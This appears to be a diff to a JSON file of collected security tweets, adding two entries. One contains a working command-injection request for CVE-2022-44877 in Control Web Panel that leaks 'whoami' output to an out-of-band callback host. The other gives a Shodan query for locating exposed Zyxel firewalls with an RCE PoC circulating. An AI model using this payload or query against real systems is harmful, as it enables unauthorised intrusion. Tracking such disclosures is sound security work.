@@ -12,6 +12,16 @@
     "username": "MsftSecIntel"
 }
 {
+    "tweetfavorites": 124,
+    "tweetquotes": 1,
+    "tweetreplies": 3,
+    "tweetretweets": 25,
+    "tweettext": "CVE-2022-44877\nControl Web Panel Unauth RCE\nPOC usage:\nPOST /login/index.php?login=$(ping${IFS}-nc${IFS}2${IFS}`whoami`.{{interactsh-url}}) HTTP/1.1\nHost: vuln\nContent-Type: application/x-www-form-urlencoded\n\nusername=root&amp;password=toor&amp;commit=Login https://t.co/CRLGltneZQ",
+    "tweettime": "2023-05-27, 06:59:56",
+    "tweeturl": "https://twitter.com/freeprogrammers/status/1662352921831284736",
+    "username": "freeprogrammers"
+}
+{
     "tweetfavorites": 0,
     "tweetquotes": 0,
     "tweetreplies": 0,
@@ -66,6 +76,16 @@
     "tweettime": "2023-05-25, 13:36:34",
     "tweeturl": "https://twitter.com/maddiestone/status/1661727963237462019",
     "username": "maddiestone"
+}
+{
+    "tweetfavorites": 45,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 15,
+    "tweettext": "[Oh noo] CVE-2023-28771 Zyxel RCE PoC available online. Update your systems!\n\n🔎 Shodan query:\n\ntitle:\"USG FLEX\",\"ATP100\",\"ATP200\",\"ATP500\",\"ATP700\",\"ZyWALL USG\"",
+    "tweettime": "2023-05-25, 06:44:34",
+    "tweeturl": "https://twitter.com/ReconOne_bk/status/1661624279467737089",
+    "username": "ReconOne_bk"
 }
 {
     "expanded_url": [
